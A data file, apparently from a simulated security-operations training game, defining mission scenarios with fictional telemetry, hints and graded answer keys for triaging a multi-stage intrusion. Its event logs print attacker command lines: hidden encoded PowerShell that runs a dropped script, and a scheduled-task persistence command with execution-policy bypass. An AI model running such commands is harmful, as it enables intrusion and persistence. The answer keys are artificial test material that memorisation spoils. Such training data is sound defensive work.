      bonusEvidenceIds: ['EVT-701', 'EVT-702', 'EVT-704', 'EVT-705'],
      expectedResponseActions: [
        {
          actionType: 'preserve_evidence',
          target: 'WKSTN-LEGAL-05',
          required: false,
          consequence: 'Volatile memory and process artifacts preserved on WKSTN-LEGAL-05 for legal forensics.'
        },
        {
          actionType: 'isolate_host',
          target: 'WKSTN-LEGAL-05',
          required: true,
          consequence: 'Workstation WKSTN-LEGAL-05 isolated from network.'
        },
        {
          actionType: 'block_ip',
          target: '203.0.113.195',
          required: true,
          consequence: 'Blocked external exfiltration IP 203.0.113.195.'
        },
        {
          actionType: 'block_domain',
          target: 'drop-storage-api.example.net',
          required: true,
          consequence: 'Sinkholed exfiltration domain drop-storage-api.example.net.'
        }
      ],
      explanation:
        'Although `SRV-FIN-BACKUP` transferred 480 MB (EVT-702), process and policy telemetry confirm it was an authorized nightly `VeeamAgent.exe` backup to `dr-vault.example.com` (EVT-701). Conversely, on `WKSTN-LEGAL-05`, `7z.exe` read restricted M&A files (EVT-703..705), compressed them into a password-protected archive `aurora_bundle.7z` (EVT-706), and uploaded 42.1 MB via `curl.exe` to `drop-storage-api.example.net` / `203.0.113.195` (EVT-707, EVT-708).'
    }
  },
  {
    id: 'mission-8-multi-stage-incident',
    order: 8,
    title: 'Mission 8: Multi-Stage Incident',
    subtitle: 'Full Kill-Chain Correlation, Decoy Filtering & Coordinated Containment',
    difficulty: 'Expert',
    estimatedMinutes: 22,
    xpReward: 600,
    minimumEvidenceRequired: 5,
    organization: 'Aegis BioLabs (Simulated Environment)',
    environment: 'Enterprise-Wide Multi-Subnet Telemetry',
    briefing: {
      summary:
        'Multiple high-priority alerts have fired across the SOC queue within a 30-minute window: authentication failures on `h.wong`, an anomalous external login on `d.thorne`, encoded PowerShell on both `SRV-PATCH-01` and `WKSTN-CORP-09`, scheduled task persistence, privilege elevation, and outbound C2 traffic. Separate the real multi-stage intrusion from benign administrative activity and unrelated user noise.',
      initialAlert: {
        alertId: 'ALT-8001',
        title: 'MULTI-STAGE ALERT: Credential Access, Execution, Persistence, Privilege Escalation & C2',
        severity: 'critical',
        triggeredAt: '2026-10-20T22:24:10Z',
        entity: 'd.thorne / WKSTN-CORP-09 / core-telemetry-gw.example.net'
      },
      knownFacts: [
        'Some alerts in the queue are unrelated user noise or verified IT change management.',
        'One initially suspicious PowerShell event on `SRV-PATCH-01` has an approved change ticket.',
        'A true multi-stage intrusion is underway across identity, endpoint, directory, and network layers.'
      ],
      unknowns: [
        'Which alerts are benign decoys and why?',
        'What is the exact chronological kill chain of the real intrusion?',
        'Which accounts, hosts, files, domains, and IPs must be contained to fully eradicate the threat?'
      ],
      telemetrySources: [
        'iam_auth',
        'edr_sensor',
        'file_integrity',
        'directory_svc',
        'dns_resolver',
        'secure_proxy',
        'perimeter_fw'
      ],
      timeWindow: '2026-10-20 22:00 UTC – 22:30 UTC',
      consequencesOfPoorDecisions:
        'Containing benign assets (`h.wong` or `SRV-PATCH-01`) will penalize your response score, while missing any stage of the `d.thorne` / `WKSTN-CORP-09` intrusion leaves the adversary entrenched.'
    },
    objectives: [
      {
        id: 'obj-8-search',
        title: 'Execute at least 2 structured queries to separate benign noise from the true intrusion chain',
        type: 'run_search',
        minCount: 2
      },
      {
        id: 'obj-8-detections',
        title: 'Run the Detection Engine to map triggered rules across the MITRE ATT&CK kill chain',
        type: 'run_detections'
      },
      {
        id: 'obj-8-timeline',
        title: 'Inspect the Investigation Timeline to verify the chronological sequence across 4+ telemetry sources',
        type: 'inspect_timeline'
      },
      {
        id: 'obj-8-evidence',
        title: 'Collect at least 5 core evidence records spanning initial login, PowerShell execution, persistence, privilege escalation, and C2 egress',
        type: 'collect_evidence',
        minCount: 5,
        requiredAnyIds: ['EVT-803', 'EVT-805', 'EVT-806', 'EVT-807', 'EVT-808', 'EVT-809', 'EVT-810'],
        minRequiredMatches: 5
      },
      {
        id: 'obj-8-response',
        title: 'Execute coordinated containment across Identity, Endpoint, and Network layers and escalate to Tier-3 IR',
        type: 'execute_response',
        minCount: 4
      },
      {
        id: 'obj-8-report',
        title: 'Submit a comprehensive final Incident Assessment Report',
        type: 'complete_assessment'
      }
    ],
    hints: [
      {
        level: 1,
        text: 'First rule out the two benign events: EVT-801 (`h.wong` mistyping password once on internal laptop) and EVT-804 (`SRV-PATCH-01` running signed `CcmExec.exe` script with ticket `CHG-90210`).'
      },
      {
        level: 2,
        text: 'Follow user `d.thorne` and host `WKSTN-CORP-09`: anomalous login from `198.51.100.142` (EVT-803) -> encoded PowerShell (EVT-805) -> dropped script `C:\\ProgramData\\NetHealth\\svc_host.ps1` (EVT-806) -> scheduled task `NetHealthMonitor` (EVT-807) -> `Domain Admins` escalation (EVT-808) -> C2 beacon to `core-telemetry-gw.example.net` / `203.0.113.211` (EVT-809, EVT-810).'
      },
      {
        level: 3,
        text: 'Classify as Malicious Incident (Critical severity). Execute: Disable Account (`d.thorne`), Isolate Host (`WKSTN-CORP-09`), Quarantine File (`svc_host.ps1`), Block Domain (`core-telemetry-gw.example.net`), Block IP (`203.0.113.211` or `198.51.100.142`), and Escalate to Tier-3 IR.'
      }
    ],
    events: [
      {
        eventId: 'EVT-801',
        timestamp: '2026-10-20T22:02:11Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'low',
        host: 'WKSTN-MKT-03',
        username: 'h.wong',
        sourceIp: '10.20.16.19',
        action: 'user_login',
        result: 'failure',
        message: 'Single password typo for h.wong on assigned internal workstation WKSTN-MKT-03, followed by immediate FIDO2 success.',
        tags: ['internal_corp'],
        metadata: { note: 'Unrelated low-severity user typo noise' }
      },
      {
        eventId: 'EVT-802',
        timestamp: '2026-10-20T22:05:10Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'medium',
        host: 'SSO-GW-01',
        username: 'd.thorne',
        sourceIp: '198.51.100.142',
        action: 'user_login',
        result: 'failure',
        message: 'Failed authentication attempt for d.thorne from external IP 198.51.100.142.',
        tags: ['external_ip', 'failed_auth'],
        metadata: { attempt: 1, relatedEventIds: ['EVT-803'] }
      },
      {
        eventId: 'EVT-803',
        timestamp: '2026-10-20T22:05:44Z',
        source: 'iam_auth',
        eventType: 'authentication',
        severity: 'high',
        host: 'WKSTN-CORP-09',
        username: 'd.thorne',
        sourceIp: '198.51.100.142',
        action: 'user_login',
        result: 'success',
        message: 'Successful authentication for d.thorne from anomalous external IP 198.51.100.142 onto WKSTN-CORP-09.',
        tags: ['external_ip', 'anomalous_geo'],
        metadata: { asn: 'AS64511-EXT', relatedEventIds: ['EVT-802', 'EVT-805'] }
      },
      {
        eventId: 'EVT-804',
        timestamp: '2026-10-20T22:08:00Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'low',
        host: 'SRV-PATCH-01',
        username: 'SYSTEM',
        processName: 'powershell.exe',
        parentProcess: 'CcmExec.exe',
        commandLine: 'powershell.exe -NoProfile -EncodedCommand VgBlAHIAaQBmAHkALQBQAGEAdABjAGgAQwBhAGMAaABlAA==',
        action: 'process_start',
        result: 'success',
        message: 'Authorized SCCM patch cache verification on SRV-PATCH-01 (Approved Change Ticket: CHG-90210).',
        tags: ['sccm_maintenance', 'signed_script'],
        metadata: { changeTicket: 'CHG-90210', decodedPreview: 'Verify-PatchCache -Silent' }
      },
      {
        eventId: 'EVT-805',
        timestamp: '2026-10-20T22:10:15Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'critical',
        host: 'WKSTN-CORP-09',
        username: 'd.thorne',
        processName: 'powershell.exe',
        parentProcess: 'w3wp.exe',
        commandLine: 'powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE4AZQB0AEgAZQBhAGwAdABoAFwAcwB2AGMAXwBoAG8AcwB0AC4AcABzADEAKQA=',
        action: 'process_start',
        result: 'success',
        message: 'Suspicious parent w3wp.exe spawned hidden PowerShell with EncodedCommand on WKSTN-CORP-09.',
        tags: ['encoded_cmd', 'suspicious_parent'],
        metadata: {
          decodedSimulatedString: '[FICTIONAL SIMULATION PAYLOAD] Stage & execute C:\\ProgramData\\NetHealth\\svc_host.ps1',
          relatedEventIds: ['EVT-803', 'EVT-806']
        }
      },
      {
        eventId: 'EVT-806',
        timestamp: '2026-10-20T22:10:22Z',
        source: 'file_integrity',
        eventType: 'file_activity',
        severity: 'high',
        host: 'WKSTN-CORP-09',
        username: 'd.thorne',
        processName: 'powershell.exe',
        action: 'file_create',
        result: 'success',
        message: 'Created unsigned PowerShell implant C:\\ProgramData\\NetHealth\\svc_host.ps1 on WKSTN-CORP-09.',
        tags: ['unsigned_script', 'programdata_drop'],
        metadata: { filePath: 'C:\\ProgramData\\NetHealth\\svc_host.ps1', relatedEventIds: ['EVT-805', 'EVT-807'] }
      },
      {
        eventId: 'EVT-807',
        timestamp: '2026-10-20T22:12:05Z',
        source: 'edr_sensor',
        eventType: 'process_execution',
        severity: 'high',
        host: 'WKSTN-CORP-09',
        username: 'd.thorne',
        processName: 'schtasks.exe',
        parentProcess: 'powershell.exe',
        commandLine: 'schtasks.exe /create /sc minute /mo 10 /tn "NetHealthMonitor" /tr "powershell.exe -ep bypass -f C:\\ProgramData\\NetHealth\\svc_host.ps1"',
        action: 'process_start',
        result: 'success',
        message: 'Registered scheduled task "NetHealthMonitor" on WKSTN-CORP-09 for persistence.',
        tags: ['persistence_change'],
        metadata: { taskName: 'NetHealthMonitor', relatedEventIds: ['EVT-806', 'EVT-808'] }
      },
      {
        eventId: 'EVT-808',
        timestamp: '2026-10-20T22:15:30Z',
        source: 'directory_svc',
        eventType: 'account_change',
        severity: 'critical',
        host: 'WKSTN-CORP-09',
        username: 'd.thorne',
        sourceIp: '10.20.25.19',
        action: 'group_membership_add',
        result: 'success',
        message: 'Account d.thorne added to "Domain Admins" security group without an approved change ticket.',
        tags: ['privileged_group', 'unapproved_change'],
        metadata: { targetUser: 'd.thorne', groupName: 'Domain Admins', changeTicket: null, relatedEventIds: ['EVT-807', 'EVT-809'] }
      },
      {
        eventId: 'EVT-809',
        timestamp: '2026-10-20T22:20:00Z',
        source: 'dns_resolver',
        eventType: 'dns_query',
        severity: 'high',
        host: 'WKSTN-CORP-09',
        username: 'd.thorne',
        sourceIp: '10.20.25.19',
        destinationIp: '203.0.113.211',
        domain: 'core-telemetry-gw.example.net',
        processName: 'powershell.exe',
        action: 'dns_lookup',
        result: 'success',
        message: 'powershell.exe resolved C2 domain core-telemetry-gw.example.net -> 203.0.113.211.',
        tags: ['suspicious_domain', 'c2_beacon'],
        metadata: { resolvedIp: '203.0.113.211', relatedEventIds: ['EVT-808', 'EVT-810'] }
      },
      {
        eventId: 'EVT-810',
        timestamp: '2026-10-20T22:24:10Z',
        source: 'secure_proxy',
        eventType: 'web_proxy',
        severity: 'critical',
        host: 'WKSTN-CORP-09',
        username: 'd.thorne',
        sourceIp: '10.20.25.19',
        destinationIp: '203.0.113.211',
        domain: 'core-telemetry-gw.example.net',
        processName: 'powershell.exe',
        action: 'http_post',
        result: 'success',
        message: 'Encrypted C2 beacon and directory dump uploaded from WKSTN-CORP-09 to core-telemetry-gw.example.net (203.0.113.211).',
        tags: ['c2_beacon', 'anomalous_egress'],
        metadata: { bytesOut: 8421000, statusCode: 200, relatedEventIds: ['EVT-809'] }
      }
    ],
    groundTruth: {
      classification: 'malicious_incident',
      severity: 'critical',
      affectedEntities: [
        'd.thorne',
        'WKSTN-CORP-09',
        'svc_host.ps1',
        'core-telemetry-gw.example.net',
        '203.0.113.211',
        '198.51.100.142'
      ],
      attackStages: ['T1078', 'T1059.001', 'T1027', 'T1053.005', 'T1098', 'T1071.004', 'T1041'],
      expectedEvidenceIds: ['EVT-803', 'EVT-805', 'EVT-806', 'EVT-807', 'EVT-808', 'EVT-809', 'EVT-810'],
      bonusEvidenceIds: ['EVT-802', 'EVT-804'],
      expectedResponseActions: [
        {
          actionType: 'disable_account',
          target: 'd.thorne',
          required: true,
          consequence: 'Compromised account d.thorne disabled.'
        },
        {
          actionType: 'isolate_host',
          target: 'WKSTN-CORP-09',
          required: true,
          consequence: 'Compromised endpoint WKSTN-CORP-09 isolated.'
        },
        {
          actionType: 'quarantine_file',
          target: 'svc_host.ps1',
          required: true,
          consequence: 'Persistent PowerShell implant svc_host.ps1 quarantined.'
        },
        {
          actionType: 'block_domain',
          target: 'core-telemetry-gw.example.net',
          required: true,
          consequence: 'C2 domain core-telemetry-gw.example.net sinkholed.'
        },
        {
          actionType: 'block_ip',
          target: ['203.0.113.211', '198.51.100.142'],
          required: false,
          consequence: 'Blocked external adversary IP infrastructure.'
        },
        {
          actionType: 'escalate_incident',
          required: false,
          consequence: 'Tier-3 Incident Response engaged for Domain Admin compromise recovery.'
        }
      ],
      explanation:
        'This multi-stage campaign began with an external login to `d.thorne` from `198.51.100.142` (EVT-803), followed by `w3wp.exe` spawning encoded PowerShell on `WKSTN-CORP-09` (EVT-805), dropping `C:\\ProgramData\\NetHealth\\svc_host.ps1` (EVT-806), registering the `NetHealthMonitor` scheduled task (EVT-807), escalating `d.thorne` to `Domain Admins` without a ticket (EVT-808), and exfiltrating directory data to `core-telemetry-gw.example.net` (`203.0.113.211`, EVT-809 & EVT-810). Meanwhile, `h.wong` (EVT-801) was a benign user password typo and `SRV-PATCH-01` (EVT-804) was an approved SCCM patch verification (`CHG-90210`).'
    }
  }
];
